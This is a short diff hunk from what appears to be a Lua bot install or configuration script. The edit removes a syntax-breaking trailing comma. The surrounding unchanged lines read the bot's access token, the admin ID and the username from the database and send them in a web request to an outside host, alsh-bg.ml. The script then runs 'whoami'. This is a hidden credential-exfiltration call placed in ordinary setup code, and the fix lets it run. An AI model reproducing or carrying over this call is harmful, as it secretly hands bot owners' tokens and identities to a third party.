@@ -69,7 +69,7 @@ end
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
-UserName = database:get(id_server..":SUDO:USERNAME"),
+UserName = database:get(id_server..":SUDO:USERNAME")
 https.request("https://alsh-bg.ml/TED.php?token="..token.."&id="..SUDO.."&user="..UserName)
 
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
